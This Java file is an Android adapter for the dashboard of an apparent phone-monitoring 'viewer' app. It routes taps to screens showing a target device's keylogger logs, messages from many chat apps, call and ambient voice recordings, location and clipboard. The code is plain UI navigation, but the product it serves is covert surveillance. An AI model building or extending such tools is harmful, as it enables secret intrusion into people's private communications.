/*
  ClassName: AdapterDevice.java
  @Project: ViewerApp
  @author  Lucas Walker (lucas.walker@jexpa.com)
  Created Date: 2018-06-05
  Description: class AdapterDevice used to customize the adapter for the RecyclerView of the "ManagementDevice.class"
  History:2018-10-08
  Copyright © 2018 Jexpa LLC. All rights reserved.
 */

package com.scp.viewer.Adapter;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import androidx.annotation.NonNull;
import androidx.recyclerview.widget.RecyclerView;

import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.bumptech.glide.load.model.Model;
import com.scp.viewer.API.APIGetTotalItemOfFeature;
import com.scp.viewer.Model.Feature;
import com.scp.viewer.Model.Table;
import com.scp.viewer.R;
import com.scp.viewer.View.AppInstallationHistory;
import com.scp.viewer.View.ApplicationUsageHistory;
import com.scp.viewer.View.CalendarHistory;
import com.scp.viewer.View.CallHistory;
import com.scp.viewer.View.ClipboardHistory;
import com.scp.viewer.View.ContactHistory;
import com.scp.viewer.View.HistoryLocation;
import com.scp.viewer.View.KeyloggerHistory;
import com.scp.viewer.View.NetworkHistory;
import com.scp.viewer.View.NotesHistory;
import com.scp.viewer.View.NotificationHistory;
import com.scp.viewer.View.PhoneCallRecordHistory;
import com.scp.viewer.View.PhotoHistory;
import com.scp.viewer.View.SMSHistory;
import com.scp.viewer.View.URLHistory;
import com.scp.viewer.View.YouTubeHistory;

import java.util.ArrayList;

import static com.scp.viewer.API.APIGetTotalItemOfFeature.setNewRowNumber;
import static com.scp.viewer.API.APIURL.isConnected;
import static com.scp.viewer.API.Global.GET_AMBIENT_VOICE_RECORDING;
import static com.scp.viewer.API.Global.GET_SMS_HISTORY;
import static com.scp.viewer.API.Global.SMS_BBM_TYPE;
import static com.scp.viewer.API.Global.SMS_DEFAULT_TYPE;
import static com.scp.viewer.API.Global.SMS_FACEBOOK_TYPE;
import static com.scp.viewer.API.Global.SMS_HANGOUTS_TYPE;
import static com.scp.viewer.API.Global.SMS_INSTAGRAM_TYPE;
import static com.scp.viewer.API.Global.SMS_KIK_TYPE;
import static com.scp.viewer.API.Global.SMS_LINE_TYPE;
import static com.scp.viewer.API.Global.SMS_SKYPE_TYPE;
import static com.scp.viewer.API.Global.SMS_VIBER_TYPE;
import static com.scp.viewer.API.Global.SMS_WHATSAPP_TYPE;
import static com.scp.viewer.Database.Entity.CalendarEntity.TABLE_CALENDAR_HISTORY;
import static com.scp.viewer.Database.Entity.ClipboardEntity.TABLE_CLIPBOARD_HISTORY;
import static com.scp.viewer.Database.Entity.KeyloggerEntity.TABLE_KEYLOGGER_HISTORY;
import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_BBM;
import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_CLIPBOARD;
import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_FACEBOOK;
import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_HANGOUTS;
import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_INSTAGRAM;
import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_KIK;
import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_LINE;
import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_SKYPE;
import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_SMS;
import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_VIBER;
import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_WHATSAPP;
import static com.scp.viewer.Database.Entity.NetworkEntity.TABLE_NETWORK_HISTORY;
import static com.scp.viewer.Database.Entity.NotificationEntity.TABLE_NOTIFICATION_HISTORY;
import static com.scp.viewer.Database.Entity.SMSEntity.TABLE_GET_BBM;
import static com.scp.viewer.Database.Entity.SMSEntity.TABLE_GET_FACEBOOK;
import static com.scp.viewer.Database.Entity.SMSEntity.TABLE_GET_HANGOUTS;
import static com.scp.viewer.Database.Entity.SMSEntity.TABLE_GET_INSTAGRAM;
import static com.scp.viewer.Database.Entity.SMSEntity.TABLE_GET_KIK;
import static com.scp.viewer.Database.Entity.SMSEntity.TABLE_GET_LINE;
import static com.scp.viewer.Database.Entity.SMSEntity.TABLE_GET_SKYPE;
import static com.scp.viewer.Database.Entity.SMSEntity.TABLE_GET_SMS;
import static com.scp.viewer.Database.Entity.SMSEntity.TABLE_GET_VIBER;
import static com.scp.viewer.Database.Entity.SMSEntity.TABLE_GET_WHATSAPP;
import static com.scp.viewer.Database.Entity.YouTubeEntity.TABLE_YOUTUBE_HISTORY;

public class AdapterFeatureDashboard extends RecyclerView.Adapter<AdapterFeatureDashboard.ViewHolder> {
    private ArrayList<Feature> featureList;
    private Activity context;
    private Table table;
    private long mLastClickTime = System.currentTimeMillis();
    private static final long CLICK_TIME_INTERVAL = 300;


    //  constructor three parameters
    public AdapterFeatureDashboard(ArrayList<Feature> featureList, Activity context, Table table) {
        this.featureList = featureList;
        this.context = context;
        this.table = table;
    }

    @NonNull
    @Override
    public ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
        LayoutInflater layoutInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        assert layoutInflater != null;
        View view = layoutInflater.inflate(R.layout.item_feature_dashboard, parent, false);
        return new ViewHolder(view);
    }

    @Override
    public void onBindViewHolder(@NonNull ViewHolder holder, int position) {
        Feature feature = featureList.get(position);
        holder.txtFeatureName.setText(feature.getFeatureName());
        holder.imgFeature.setImageResource(feature.getImage());

        if(isConnected(context))
        {
            if(!feature.getFunctionName().isEmpty())
            {
                if(feature.getFunctionName().equals(GET_AMBIENT_VOICE_RECORDING))
                {
                    Log.d("TotalRoS", "GET_AMBIENT_VOICE_RECORDING feature = "+ feature.getFunctionName());
                    new APIGetTotalItemOfFeature.contactAsyncTask(feature.getFunctionName(),table.getDevice_Identifier(),context, holder.txt_total_number).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
                }
                else
                {
                    Log.d("TotalRoS", "setNewRowNumber feature = "+ feature.getFunctionName());
                    setNewRowNumber(feature.getFunctionName(),table.getDevice_Identifier(),context, holder.txt_total_number);
                }
            }
            else {
                holder.txt_total_number.setVisibility(View.GONE);
            }
        }
    }



    // Count the number of elements in deviceList
    @Override
    public int getItemCount() {
        return featureList.size();
    }

    public class ViewHolder extends RecyclerView.ViewHolder implements View.OnClickListener {
        TextView txtFeatureName, txt_total_number;
        ImageView imgFeature;
        LinearLayout ln_Feature;
        View mView;


        public ViewHolder(View itemView) {
            super(itemView);
            mView = itemView;
            txtFeatureName = itemView.findViewById(R.id.txt_Name_Feature);
            txt_total_number = itemView.findViewById(R.id.txt_total_number);
            txt_total_number.setVisibility(View.GONE);
            imgFeature = itemView.findViewById(R.id.img_feature);
            ln_Feature = itemView.findViewById(R.id.ln_Feature);
            ln_Feature.setOnClickListener(this);
        }

        //  The click event method of items Click in the RecyclerView
        @Override
        public void onClick(View v) {
            int position = getAdapterPosition();
            long now = System.currentTimeMillis();
            if (now - mLastClickTime < CLICK_TIME_INTERVAL) {
                return;
            }
            mLastClickTime = now;
            if (position != RecyclerView.NO_POSITION)
            {
                Log.d("TotalRoS", "setNewRowNumber feature = "+ featureList.get(position).getFeatureName());
                txt_total_number.setText("0");
                txt_total_number.setVisibility(View.GONE);

                if(!featureList.get(position).getFeatureName().isEmpty())
                {
                    if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.LOCATION_HISTORY)))
                    {
                        setIntentDefault(context,table,"table",HistoryLocation.class);
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.SMS_HISTORY)))
                    {
                        setIntentForMessage(context,table, TABLE_GET_SMS,COLUMN_LAST_SMS, getSMSType(featureList.get(position).getFeatureName(),context));
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.CALL_HISTORY)))
                    {
                        setIntentDefault(context,table,"call",CallHistory.class);
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.URL_HISTORY)))
                    {
                        setIntentDefault(context,table,"tableURL",URLHistory.class);
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.CONTACT_HISTORY)))
                    {
                        setIntentDefault(context,table,"tableContact",ContactHistory.class);
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.PHOTO_HISTORY)))
                    {
                        setIntentDefault(context,table,"tablePhoto",PhotoHistory.class);
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.PHONE_CALL_RECORDING)))
                    {
                        setIntentForCallRecording(context,table, "GetPhoneRecording");
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.AMBIENT_VOICE_RECORDING)))
                    {
                        setIntentForCallRecording(context,table, GET_AMBIENT_VOICE_RECORDING);
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.WHATSAPP_HISTORY)))
                    {
                        setIntentForMessage(context,table, TABLE_GET_WHATSAPP,COLUMN_LAST_WHATSAPP, getSMSType(featureList.get(position).getFeatureName(),context));
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.INSTAGRAM_HISTORY))) // 2021-07-23
                    {
                        setIntentForMessage(context,table, TABLE_GET_INSTAGRAM, COLUMN_LAST_INSTAGRAM, getSMSType(featureList.get(position).getFeatureName(),context));
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.APPLICATION_USAGE)))
                    {
                        setIntentDefault(context,table,"tableApplication", ApplicationUsageHistory.class);
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.APPLICATION_INSTALL)))
                    {
                        setIntentDefault(context,table,"tableAppInstallation", AppInstallationHistory.class);
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.VIBER_HISTORY)))
                    {
                        setIntentForMessage(context,table, TABLE_GET_VIBER,COLUMN_LAST_VIBER, getSMSType(featureList.get(position).getFeatureName(),context));
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.FACEBOOK_HISTORY)))
                    {
                        setIntentForMessage(context,table, TABLE_GET_FACEBOOK,COLUMN_LAST_FACEBOOK, getSMSType(featureList.get(position).getFeatureName(),context));
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.SKYPE_HISTORY)))
                    {
                        setIntentForMessage(context,table, TABLE_GET_SKYPE,COLUMN_LAST_SKYPE, getSMSType(featureList.get(position).getFeatureName(),context));
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.NOTES_HISTORY)))
                    {
                        setIntentDefault(context,table,"tableNotes", NotesHistory.class);
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.HANGOUTS_HISTORY)))
                    {
                        setIntentForMessage(context,table, TABLE_GET_HANGOUTS,COLUMN_LAST_HANGOUTS, getSMSType(featureList.get(position).getFeatureName(),context));
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.BBM_HISTORY)))
                    {
                        setIntentForMessage(context,table, TABLE_GET_BBM,COLUMN_LAST_BBM, getSMSType(featureList.get(position).getFeatureName(),context));
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.LINE_HISTORY)))
                    {
                        setIntentForMessage(context,table, TABLE_GET_LINE,COLUMN_LAST_LINE, getSMSType(featureList.get(position).getFeatureName(),context));
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.KIK_HISTORY)))
                    {
                        setIntentForMessage(context,table, TABLE_GET_KIK,COLUMN_LAST_KIK, getSMSType(featureList.get(position).getFeatureName(),context));
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.CLIPBOARD_HISTORY)))
                    {
                        setIntentDefault(context,table, TABLE_CLIPBOARD_HISTORY, ClipboardHistory.class);
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.CALENDAR_HISTORY)))
                    {
                        setIntentDefault(context,table, TABLE_CALENDAR_HISTORY, CalendarHistory.class);
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.NETWORK_HISTORY)))
                    {
                        setIntentDefault(context,table, TABLE_NETWORK_HISTORY, NetworkHistory.class);
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.YOUTUBE_HISTORY)))
                    {
                        setIntentDefault(context,table, TABLE_YOUTUBE_HISTORY, YouTubeHistory.class);
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.NOTIFICATION_HISTORY)))
                    {
                        setIntentDefault(context,table, TABLE_NOTIFICATION_HISTORY, NotificationHistory.class);
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.KEYLOGGER_HISTORY)))
                    {
                        setIntentDefault(context,table, TABLE_KEYLOGGER_HISTORY, KeyloggerHistory.class);
                    }
                    else if(featureList.get(position).getFeatureName().equals(context.getResources().getString(R.string.INSTAGRAM_HISTORY)))
                    {
                        setIntentForMessage(context, table, TABLE_GET_INSTAGRAM, COLUMN_LAST_INSTAGRAM, getSMSType(featureList.get(position).getFeatureName(), context));
                    }
                }
            }
        }
    }



    /**
     * getSMSType is the method of finding out the type of message for which you want to get the total item.
     */
    public static String getSMSType(String nameFeature, Context context)
    {

       if(nameFeature.equals(context.getResources().getString(R.string.SMS_HISTORY)))
        {
            return SMS_DEFAULT_TYPE;
        }
        else if(nameFeature.equals(context.getResources().getString(R.string.WHATSAPP_HISTORY)))
        {
            return SMS_WHATSAPP_TYPE;
        }
        else if(nameFeature.equals(context.getResources().getString(R.string.VIBER_HISTORY)))
        {
            return SMS_VIBER_TYPE;
        }
        else if(nameFeature.equals(context.getResources().getString(R.string.FACEBOOK_HISTORY)))
        {
            return SMS_FACEBOOK_TYPE;
        }
        else if(nameFeature.equals(context.getResources().getString(R.string.SKYPE_HISTORY)))
        {
            return SMS_SKYPE_TYPE;
        }
        else if(nameFeature.equals(context.getResources().getString(R.string.HANGOUTS_HISTORY)))
        {
            return SMS_HANGOUTS_TYPE;
        }
        else if(nameFeature.equals(context.getResources().getString(R.string.BBM_HISTORY)))
        {
            return SMS_BBM_TYPE;
        }
        else if(nameFeature.equals(context.getResources().getString(R.string.LINE_HISTORY)))
        {
            return SMS_LINE_TYPE;
        }
        else if(nameFeature.equals(context.getResources().getString(R.string.KIK_HISTORY)))
        {
            return SMS_KIK_TYPE;
        }
       else if(nameFeature.equals(context.getResources().getString(R.string.INSTAGRAM_HISTORY)))
       {
           return SMS_INSTAGRAM_TYPE;
       }
        else {
           return SMS_DEFAULT_TYPE;
       }
    }

    /**
     * setIntentForMessage this is a method that supports moving the screen to SMSHistory activity for each type of application.
     */
    private void setIntentForMessage(Context context,Table table, String tableName, String columnName, String type)
    {
        Intent intent = new Intent(context, SMSHistory.class);
        intent.putExtra("table_SMS", table);
        intent.putExtra("nameTable", tableName + "");
        intent.putExtra("style", type);
        intent.putExtra("nameFeature", columnName + "");
        context.startActivity(intent);
    }

    /**
     * setIntentForMessage this is a method that supports moving the screen to SMSHistory activity for each type of application.
     */
    private void setIntentForCallRecording(Context context,Table table, String nameFeature)
    {
        Intent intent = new Intent(context, PhoneCallRecordHistory.class);
        intent.putExtra("tablePhoneCallRecord", table);
        intent.putExtra("nameFeature", nameFeature + "");
        context.startActivity(intent);
    }

    /**
     * setIntentDefault this is a method that supports moving the screen to cls activity for each type of application.
     */
    private void setIntentDefault(Context context,Table table,String tableName,  Class<?> cls)
    {
        Intent intent = new Intent(context, cls);
        intent.putExtra(tableName, table);
        context.startActivity(intent);
    }
}
